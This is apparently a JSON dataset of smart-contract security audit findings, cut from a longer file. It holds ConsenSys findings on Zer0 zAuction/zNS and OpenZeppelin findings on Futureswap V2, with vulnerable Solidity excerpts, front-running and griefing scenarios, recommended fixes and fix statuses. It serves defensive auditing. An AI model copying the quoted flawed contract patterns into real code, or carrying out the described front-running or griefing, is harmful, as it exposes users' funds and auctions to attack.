      "content": "#### Resolution\n\n\n\nAddressed with [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) and the following statement:\n\n\n\n> \n> 5.30 weth address in constructor\n> \n> \n> \n\n\nNote: does not perform input validation as recommended\n\n\n\n\n#### Description\n\n\nThe auction contract hardcodes the [WETH ERC20](https://ropsten.etherscan.io/address/0xc778417e063141139fce010982780140aa0cd5ab) token address. this address will not be functional when deploying to mainnet.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuction.sol:L15-L16**\n\n\n\n```\n    IERC20 weth = IERC20(address(0xc778417E063141139Fce010982780140Aa0cD5Ab)); // rinkeby weth\n\n\n```\n#### Recommendation\n\n\nConsider taking the used `WETH` token address as a constructor argument. Avoid code changes to facilitate testing! Perform input validation on arguments rejecting `address(0x0)` to facilitate the detection of potential misconfiguration in the deployment pipeline.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13388",
      "title": "zAuction - auctions/offers can be terminated by reusing the auction id ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with [zer0-os/[email protected]`8ff0eab`](https://github.com/zer0-os/zAuction/commit/8ff0eab02e5c23bb513d90e3ff1ba8fa04f81b7a) by binding `saleId` to the `seller` in `zSale` and the `auctionId` to the `bidder` in `zAuction`.\n\n\nIn the `zSale` case the `saleId` is chosen by the seller. The offer (signed offer parameters including saleid) is shared on an off-chain channel. The buyer calls `zSale.purchase` to buy the token from the offer. The offer and all offers containing the same seller+saleid are then invalidated.\n\n\nIn `zAuction` there is no seller or someone who initiates an auction. Anyone can bid for nft’s held by anyone else. The bidder chooses an auction id. There might be multiple bidders. Since the auctionId is an individual choice and the smart contract does not enforce an auction to be started there may be multiple auctions for the same token but using different auction ids. The current mechanism automatically invalidates all current bids for the token+auctionId combination for the winning bidder. Bids by other holders are not automatically invalidated but they can be invalidated manually via `cancelBidsUnderPrice` for an auctionId. Note that the winning bid is chosen by the nftowner/seller. The new owner of the nft may be able to immediately accept another bid and transfer the token `[seller]--acceptBid-->[newOwner-A]--acceptBid-->[newOwner-B]`.\n\n\n\n\n#### Description\n\n\n[zer0-os/[email protected]`2f92aa1`](https://github.com/zer0-os/zAuction/commit/2f92aa1c9cd0c53ec046340d35152460a5fe7dd0) introduced a way of tracking auctions/sales by using an `auctionId/saleId`. The id’s are unique and the same id cannot be used for multiple auctions/offers.\n\n\nTwo different auctions/offers may pick the same id, the first auction/offer will go through while the latter cannot be fulfilled anymore. This may happen accidentally or intentionally be forced by a malicious actor to terminate active auctions/sales (griefing, front-running).\n\n\n#### Examples\n\n\nAlice puts out an offer for someone to buy nft `X` at a specific price. Bob decides to accept that offer and buy the nft by calling `zSale.purchase(saleid, price, token, ...)`. Mallory monitors the mempool, sees this transaction, front-runs it to fulfill its own sale (for a random nft he owns) reusing the saleid from Bobs transaction. Since Mallories transaction marks the saleid as consumed it terminates Alie’s offer and hence Bob cannot buy the token as the transaction will revert.\n\n\n#### Recommendation\n\n\nConsider using `keccak(saleid+nftcontract+nfttokenid)` as the unique sale/auction identifier instead, or alternatively associate the bidder address with the auctionId (require that `consumed[bidder][auctionId]== false`)",
      "summary": "\nThis bug report addresses an issue with the unique sale/auction identifier used by zAuction. This identifier, which is used to track auctions/sales, is unique and the same id cannot be used for multiple auctions/offers. The problem is that two different auctions/offers may pick the same id, the first auction/offer will go through while the latter cannot be fulfilled anymore. This can be used maliciously to terminate active auctions/sales (griefing, front-running). \n\nAn example of this would be Alice putting out an offer for someone to buy nft `X` at a specific price. Bob decides to accept that offer and buy the nft by calling `zSale.purchase(saleid, price, token, ...)`. Mallory monitors the mempool, sees this transaction, front-runs it to fulfill its own sale (for a random nft he owns) reusing the saleid from Bobs transaction. Since Mallories transaction marks the saleid as consumed it terminates Alie’s offer and hence Bob cannot buy the token as the transaction will revert. \n\nThe resolution to this issue is to use `keccak(saleid+nftcontract+nfttokenid)` as the unique sale/auction identifier instead, or alternatively associate the bidder address with the auctionId (require that `consumed[bidder][auctionId]== false`). This was addressed with [zer0-os/[email protected]`8ff0eab`](https://github.com/zer0-os/zAuction/commit/8ff0eab02e5c23bb513d90e3ff1ba8fa04f81b7a) by binding `saleId` to the `seller` in `zSale` and the `auctionId` to the `bidder` in `zAuction`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13387",
      "title": "zAuction - functionality outlined in specification that is not implemented yet ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nimplemented as `zSale` with changes from [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec).\n\n\n#### Description\n\n\nThe [specification](https://docs.google.com/document/d/1FvQGTMJPQHcmga10vCh52AdSoKcHBgUkFyQggvbMM6U) outlines three main user journeys of which one does not seem to be implemented.\n\n\n1. Users will be able to do simple transfer of NFTs. - which does not require functionality in the smart contract\n2. Users will be able to post NFTs at a sale price, and buy at that price. - does not seem to be implemented\n3. Users will be able to post NFTs for auction, bid on auctions, and accept bids - is implemented\n\n\n#### Recommendation\n\n\nUser flow (2) is not implemented in the smart contract system. Consider updating the spec or clearly highlighting functionality that is still in development for it to be excluded from security testing.",
      "summary": "\nThis bug report concerns a smart contract system that is not fully implemented according to its specification. The system is intended to allow users to do simple transfer of NFTs, post NFTs at a sale price, and buy at that price, as well as post NFTs for auction, bid on auctions, and accept bids. However, the second user flow, which allows users to post NFTs at a sale price and buy at that price, is not implemented in the smart contract system. It has been resolved by implementing the `zSale` with changes from the specified Github commit. The recommendation is to update the specification or clearly highlight the functionality that is still in development so that it can be excluded from security testing.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13386",
      "title": "zAuction, zNS - gas griefing by spamming offchain fake bids  Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed and acknowledged with changes from [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec). The client provided the following remark:\n\n\n\n> \n> 5.19 I have attempted to order the requires sensibly, putting the least expensive first. Please advise if the ordering is optimal. gas griefing will be mitigated in the dapp with off-client checks\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe execution status of both `zAuction.acceptBid` and `StakingController.fulfillDomainBid` transactions depend on the bidder, as his approval is needed, his signature is being validated, etc. However, these transactions can be submitted by accounts that are different from the bidder account, or for accounts that do not have the required funds/deposits available, luring the account that has to perform the on-chain call into spending gas on a transaction that is deemed to fail (gas griefing). E.g. posting high-value fake bids for zAuction without having funds deposited or `WETH` approved.\n\n\n#### Examples\n\n\n**zNS/contracts/StakingController.sol:L120-L152**\n\n\n\n```\n  function fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n  bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n  address recoveredBidder = recover(recoveredBidHash, signature);\n  require(recipient == recoveredBidder, \"ZNS: bid info doesnt match/exist\");\n  bytes32 hashOfSig = keccak256(abi.encode(signature));\n  require(approvedBids[hashOfSig] == true, \"ZNS: has been fullfilled\");\n  infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n  uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n  registrar.setDomainMetadataUri(id, metadata);\n  registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n  registrar.transferFrom(controller, recoveredBidder, id);\n  if (lockOnCreation) {\n    registrar.lockDomainMetadataForOwner(id);\n  }\n  approvedBids[hashOfSig] = false;\n  emit DomainBidFulfilled(\n    metadata,\n    name,\n    recoveredBidder,\n    id,\n    parentId\n  );\n}\n\n```\n**zAuction/contracts/zAuction.sol:L35-L44**\n\n\n\n```\nfunction acceptBid(bytes memory signature, uint256 rand, address bidder, uint256 bid, address nftaddress, uint256 tokenid) external {\n    address recoveredbidder = recover(toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid))), signature);\n    require(bidder == recoveredbidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftcontract = IERC721(nftaddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftcontract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftaddress, tokenid);\n}\n\n```\n#### Recommendation\n\n\n* Revert early for checks that depend on the bidder before performing gas-intensive computations.\n* Consider adding a dry-run validation for off-chain components before transaction submission.",
      "summary": "\nThis bug report is about a gas griefing issue with the zAuction and StakingController contracts. Gas griefing is when someone submits a transaction that is deemed to fail, luring the account that has to perform the on-chain call into spending gas on a transaction that is not successful. This issue was addressed and acknowledged with changes from [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec). \n\nThe execution status of both `zAuction.acceptBid` and `StakingController.fulfillDomainBid` transactions depend on the bidder, as his approval is needed, his signature is being validated, etc. However, these transactions can be submitted by accounts that are different from the bidder account, or for accounts that do not have the required funds/deposits available. The client provided the following remark: \"I have attempted to order the requires sensibly, putting the least expensive first. Please advise if the ordering is optimal. gas griefing will be mitigated in the dapp with off-client checks\". \n\nTo prevent this issue from happening again, it is recommended to revert early for checks that depend on the bidder before performing gas-intensive computations. Additionally, consider adding a dry-run validation for off-chain components before transaction submission.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13385",
      "title": "zAuction - unclear upgrade path ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nobsolete with changes from [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) removing the `zAccountAccountant`.\n\n\n#### Description\n\n\n`zAuction` appears to implement an upgrade path for the auction system via `zAuctionAccountant`. `zAuction` itself does not hold any value. The `zAuctionAccountant` can be configured to allow only one `zAution` contract to interact with it. The update of the contract reference takes effect immediately (<https://github.com/ConsenSys/zer0-zauction-audit-2021-05/issues/7)>.\n\n\nAcceptance of bids via the accountant on the old contract immediately fail after an admin updates the referenced `zAuction` contract while `WETH` bids may still continue. This may create an unfavorable scenario where two contracts may be active in parallel accepting `WETH` bids.\n\n\nIt should also be noted that 2nd layer bids (signed data) using the accountant for the old contract will not be acceptable anymore.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuctionAccountant.sol:L60-L63**\n\n\n\n```\nfunction SetZauction(address zauctionaddress) external onlyAdmin{\n    zauction = zauctionaddress;\n    emit ZauctionSet(zauctionaddress);\n}\n\n```\n#### Recommendation\n\n\nConsider re-thinking the upgrade path. Avoid keeping multiple versions of the auction contact active.",
      "summary": "\nThis bug report is about a problem with the `zAuction` contract, which does not hold any value, but is used to upgrade the auction system via `zAuctionAccountant`. The issue is that when an admin updates the referenced `zAuction` contract, bids made via the accountant on the old contract will immediately fail, but `WETH` bids may still continue. This could lead to two contracts being active in parallel, accepting `WETH` bids. Additionally, 2nd layer bids (signed data) using the accountant for the old contract will no longer be accepted. The recommendation is to re-think the upgrade path and avoid keeping multiple versions of the auction contact active.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13384",
      "title": "zAuction - pot. initialization fronrunning and unnecessary init function ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) and the following statement:\n\n\n\n> \n> 5.21 init deprecated, constructor added\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe `zAuction` initialization method is unprotected and while only being executable once, can be called by anyone. This might allow someone to monitor the mempool for new deployments of this contract and fron-run the initialization to initialize it with different parameters.\n\n\nA mitigating factor is that this condition can be detected by the deployer as subsequent calls to `init()` will fail.\n\n\n* Note: this doesn’t adhere to common interface naming convention/oz naming convention where this method would be called `initialize`.\n* Note: that zNS in contrast relies on ou/initializable pattern with proper naming.\n* Note: that this function might not be necessary at all and should be replaced by a constructor instead, as the contract is not used with a proxy pattern.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuction.sol:L22-L26**\n\n\n\n```\nfunction init(address accountantaddress) external {\n    require(!initialized);\n    initialized = true;\n    accountant = zAuctionAccountant(accountantaddress);\n}\n\n```\n#### Recommendation\n\n\nThe contract is not used in a proxy pattern, hence, the initialization should be performed in the `constructor` instead.",
      "summary": "\nThis bug report concerns the zAuction contract, which has an unprotected initialization method that can be called by anyone. This could allow someone to monitor the mempool for new deployments of the contract and front-run the initialization to change its parameters. The deployer can detect this condition as subsequent calls to the initialization method will fail. The report recommends replacing the initialization method with a constructor, as the contract is not used in a proxy pattern. This would adhere to common interface naming conventions and the oz naming convention, where the method would be called \"initialize\".",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13383",
      "title": "zAuction, zNS - Bids cannot be cancelled, never expire, and the auction lifecycle is unclear ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\n* Addressed with zer0-os/[[email protected]](/cdn-cgi/l/email-protection) by refactoring the `StakingController` to control the lifecycle of bids instead of handling this off-chain.\n* Addressed with [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) for `zAuction` by adding a bid/saleOffer expiration for bids. The client also provided the following statement:\n\n\n\n> \n> 5.6 added expireblock and startblock to zauction, expireblock to zsale\n> Decided not to add a cancel function. Paying gas to cancel isn’t ideal, and it can be used as a griefing function. though that’s still possible to do by moving weth but differently\n> \n> \n> \n\n\nThe stateless nature of auctions may make it hard to enforce bid/sale expirations and it is not possible to cancel a bid/offer that should not be valid anymore. The expiration reduces the risk of old offers being used as they now automatically invalidate after time, however, it is still likely that multiple valid offers may be present at the same time. As outlined in the recommendation, one option would be to allow someone who signed a commitment to explicitly cancel it in the contract. Another option would be to create a stateful auction where the entity that puts up something for “starts” an auction, creating an auction id, requiring bidders to bid on that auction id. Once a bid is accepted the auction id is invalidated which invalidates all bids that might be floating around.\n\n\n**UPDATE** Fixed with [zer0-os/[email protected]`2f92aa1`](https://github.com/zer0-os/zAuction/commit/2f92aa1c9cd0c53ec046340d35152460a5fe7dd0) for `zAuction/zSale` by allowing the seller (`zSale`) to cancel their offer, and by allowing the bidder (`zAuction`) to cancel bids (pot. more than one per auction) up to a certain price threshold. Since `auctionId` can only be used once, all other bids for an auction are automatically invalidated after a bid is accepted. Note that the current version is using a unique number as an auction id. There can be concurrent auctions that by chance or maliciously use the same auction id. The first auction to pass will cancel the competing auction that was using the same id. This fact can be used as a griefing vector to terminate running auctions by reusing the other auctions id and self-accepting the bid. The other auction cannot be fulfilled anymore.\n\n\n\n\n#### Description\n\n\nThe lifecycle of a bid both for `zAuction` and `zNS` is not clear, and has many flaws.\n\n\n* `zAuction` - Consider the case where a bid is placed, then the underlying asset in being transferred to a new owner. The new owner can now force to sell the asset even though it’s might not be relevant anymore.\n* `zAuction` - Once a bid was accepted and the asset was transferred, all other bids need to be invalidated automatically, otherwise and old bid might be accepted even after the formal auction is over.\n* `zAuction`, `zNS` - There is no way for the bidder to cancel an old bid. That might be useful in the event of a significant change in market trend, where the old pricing is no longer relevant. Currently, in order to cancel a bid, the bidder can either withdraw his ether balance from the `zAuctionAccountant`, or disapprove `WETH` which requires an extra transaction that might be front-runned by the seller.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuction.sol:L35-L45**\n\n\n\n```\nfunction acceptBid(bytes memory signature, uint256 rand, address bidder, uint256 bid, address nftaddress, uint256 tokenid) external {\n    address recoveredbidder = recover(toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid))), signature);\n    require(bidder == recoveredbidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftcontract = IERC721(nftaddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftcontract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftaddress, tokenid);\n}\n\n\n```\n**zNS/contracts/StakingController.sol:L120-L152**\n\n\n\n```\n  function fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n  bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n  address recoveredBidder = recover(recoveredBidHash, signature);\n  require(recipient == recoveredBidder, \"ZNS: bid info doesnt match/exist\");\n  bytes32 hashOfSig = keccak256(abi.encode(signature));\n  require(approvedBids[hashOfSig] == true, \"ZNS: has been fullfilled\");\n  infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n  uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n  registrar.setDomainMetadataUri(id, metadata);\n  registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n  registrar.transferFrom(controller, recoveredBidder, id);\n  if (lockOnCreation) {\n    registrar.lockDomainMetadataForOwner(id);\n  }\n  approvedBids[hashOfSig] = false;\n  emit DomainBidFulfilled(\n    metadata,\n    name,\n    recoveredBidder,\n    id,\n    parentId\n  );\n}\n\n```\n#### Recommendation\n\n\nConsider adding an expiration field to the message signed by the bidder both for `zAuction` and `zNS`.\nConsider adding auction control, creating an `auctionId`, and have users bid on specific auctions. By adding this id to the signed message, all other bids are invalidated automatically and users would have to place new bids for a new auction. Optionally allow users to cancel bids explicitly.\n\n\n\n> \n>",
      "summary": "\nA bug was reported regarding the lack of control over the lifecycle of bids in the `zAuction` and `zNS` contracts. This could lead to a situation where a new owner of an asset can force to sell it even though it might not be relevant anymore, or where bids are not automatically invalidated after the formal auction is over. Currently, in order to cancel a bid, the bidder either has to withdraw their ether balance from the `zAuctionAccountant` or disapprove `WETH`, which requires an extra transaction that might be front-runned by the seller. \n\nTo address this issue, it was recommended to add an expiration field to the message signed by the bidder, and to consider adding auction control, creating an `auctionId`, and have users bid on specific auctions. That way, all other bids are invalidated automatically and users would have to place new bids for a new auction. An optional feature could be to allow users to cancel bids explicitly.\n\nThe bug has now been fixed with [zer0-os/[email protected]`2f92aa1`](https://github.com/zer0-os/zAuction/commit/2f92aa1c9cd0c53ec046340d35152460a5fe7dd0) for `zAuction/zSale` by allowing the seller (`zSale`) to cancel their offer, and by allowing the bidder (`zAuction`) to cancel bids (pot. more than one per auction) up to a certain price threshold. Since `auctionId` can only be used once, all other bids for an auction are automatically invalidated after a bid is accepted. Note that the current version is using a unique number as an auction id. There can be concurrent auctions that by chance or maliciously use the same auction id. The first auction to pass will cancel the competing auction that was using the same id. This fact can be used as a griefing vector to terminate running auctions by reusing the other auctions id and self-accepting the bid. The other auction cannot be fulfilled anymore.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13382",
      "title": "zAuction - Unpredictable behavior for users due to admin front running or general bad timing ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nobsolete with changes from [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) removing the `zAccountAccountant`. The client provided the following remark:\n\n\n\n> \n> 5.20 accountant deprecated\n> \n> \n> \n\n\n\n\n#### Description\n\n\nAn administrator of `zAuctionAccountant` contract can update the `zAuction` contract without warning. This has the potential to violate a security goal of the system.\n\n\nSpecifically, privileged roles could use front running to make malicious changes just ahead of incoming transactions, or purely accidental negative effects could occur due to the unfortunate timing of changes.\n\n\nIn general users of the system should have assurances about the behavior of the action they’re about to take.\n\n\n#### Examples\n\n\n* updating the `zAuction` takes effect immediately. This has the potential to fail acceptance of bids by sellers on the now outdated `zAuction` contract as interaction with the accountant contract is now rejected. This forces bidders to reissue their bids in order for the seller to be able to accept them using the Accountant contract. This may also be used by admins to selectively censor the acceptance of accountant based bids by changing the active zAuction address.\n\n\n**zAuction/contracts/zAuctionAccountant.sol:L60-L68**\n\n\n\n```\n    function SetZauction(address zauctionaddress) external onlyAdmin{\n        zauction = zauctionaddress;\n        emit ZauctionSet(zauctionaddress);\n    }\n\n    function SetAdmin(address newadmin) external onlyAdmin{\n        admin = newadmin;\n        emit AdminSet(msg.sender, newadmin);\n    }\n\n```\n* Upgradeable contracts may introduce the same unpredictability issues where the proxyUpgradeable owner may divert execution to a new zNS registrar implementation selectively for certain transactions or without prior notice to users.\n\n\n#### Recommendation\n\n\nThe underlying issue is that users of the system can’t be sure what the behavior of a function call will be, and this is because the behavior can change at any time.\n\n\nWe recommend giving the user advance notice of changes with a time lock. For example, make all system-parameter and upgrades require two steps with a mandatory time window between them. The first step merely broadcasts to users that a particular change is coming, and the second step commits that change after a suitable waiting period. This allows users that do not accept the change to withdraw immediately.\n\n\nValidate arguments before updating contract addresses (at least != current/0x0). Consider implementing a 2-step admin ownership transfer (transfer+accept) to avoid losing control of the contract by providing the wrong `ETH` address.",
      "summary": "\nThis bug report is about the administrator of the zAuctionAccountant contract being able to update the zAuction contract without warning. This could lead to malicious changes being made by privileged roles, or purely accidental negative effects occurring due to the timing of the change. Examples include updating the zAuction taking effect immediately, which could fail acceptance of bids by sellers, or the proxyUpgradeable owner selectively diverting execution to a new zNS registrar implementation.\n\nThe underlying issue is that users of the system can’t be sure what the behavior of a function call will be, as the behavior can change at any time. The recommendation is to give users advance notice of changes with a time lock. This allows users that do not accept the change to withdraw immediately. It is also recommended to validate arguments before updating contract addresses and to implement a 2-step admin ownership transfer (transfer+accept) to avoid losing control of the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13381",
      "title": "zAuction - incomplete / dead code zWithdraw and zDeposit ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nobsolete with changes from [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) removing the `zAccountAccountant`.\n\n\n#### Description\n\n\nThe code generally does not appear to be production-ready. The methods `zWithdraw` and `zDeposit` do not appear to be properly implemented. `zWithdraw` rather burns `ETH` balance than withdrawing it for an account (missing transfer) and `zDeposit` manipulates an accounts balance but never receives the `ETH` amount it credits to an account.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuctionAccountant.sol:L44-L52**\n\n\n\n```\n    function zDeposit(address to) external payable onlyZauction {\n        ethbalance[to] = SafeMath.add(ethbalance[to], msg.value);\n        emit zDeposited(to, msg.value);\n    }\n\n    function zWithdraw(address from, uint256 amount) external onlyZauction {\n        ethbalance[from] = SafeMath.sub(ethbalance[from], amount);\n        emit zWithdrew(from, amount);\n    }\n\n```\n#### Recommendation\n\n\nThe methods do not seem to be used by the zAuction contract. It is highly discouraged from shipping incomplete implementations in productive code. Remove dead/unreachable code. Fix the implementations to perform proper accounting before reintroducing them if they are called by zAuction.",
      "summary": "\nThis bug report is about the code in the zAuctionAccountant.sol file. The methods zWithdraw and zDeposit do not appear to be properly implemented. zWithdraw burns ETH balance rather than withdrawing it for an account and zDeposit manipulates an accounts balance but never receives the ETH amount it credits to an account. It is not recommended to ship incomplete implementations in productive code. The resolution for this bug is to remove the code and fix the implementations before reintroducing them if they are called by zAuction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "11146",
      "title": "[L05] Unreachable code in Wallet.maybeWrapToken",
      "impact": "LOW",
      "content": "The [second conditional expression](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol#L111) in the `Wallet.maybeWrapToken` function will always be `false` unless the `_publicTokenAddress` is malicious and returns inconsistent values for its `decimals`. Consider removing this `if` statement to reduce the deployment size of the contract.\n\n\n**Update:** *Fixed in [PR #521](https://github.com/futureswap/fs-core/pull/521).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11145",
      "title": "[L04] Unchecked input in Registry.removeExchange",
      "impact": "LOW",
      "content": "The [`Registry.removeExchange` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L259) does not require that the input `_exchange` is already in the `exchangeMapping`. Consider adding such a `require` statement to the `removeExchange` function. This will prevent an event (which doesn’t exist yet, but should as per the “Lack of event emissions during important actions” issue) from firing when the `removeExchange` function is called but no exchange has been removed.\n\n\n**Update:** *Fixed in [PR #520](https://github.com/futureswap/fs-core/pull/520).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11144",
      "title": "[L03] Unchecked input in Registry.addExchange",
      "impact": "LOW",
      "content": "The [`Registry.addExchange` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L253) does not require that the input `_exchange` has not already been added. This means it is possible that a given exchange can be pushed to the `exchanges` array several times. If this happens, then the [`removeExchange` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L259) will remove only one instance of the exchange from the `exchanges` array — resulting in a state where an exchange is present in the `exchanges` array but does not have wallet access and does not appear in the `exchangeMapping` mapping.\n\n\nConsider having the `addExchange` function require that the `_exchange` has not already been added.\n\n\n**Update:** *Fixed in [PR #520](https://github.com/futureswap/fs-core/pull/520).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11143",
      "title": "[L02] Unbounded Loops",
      "impact": "LOW",
      "content": "There are a few unbounded loops in the codebase, such as the for loops in the [doFireRegistryUpdateEvent](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L210) and [getIndexOf](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L282) functions. These loops can exceed the block gas limit if the exchanges array is sufficiently large. This could prevent the voting system from being able to update addresses in the registry, and could also prevent the removal of exchanges from the exchanges array. We believe the Futureswap team is aware of this issue. We recommend keeping this issue in mind when supporting a large number of exchanges.\n\n\n**Update:** *Unchanged. Comment from the Futureswap team: “The Futureswap team does not intend to launch a large number of exchanges and would update contracts beforehand if this was ever necessary. No change done.”*",
      "summary": "",
      "quality_score": 0,
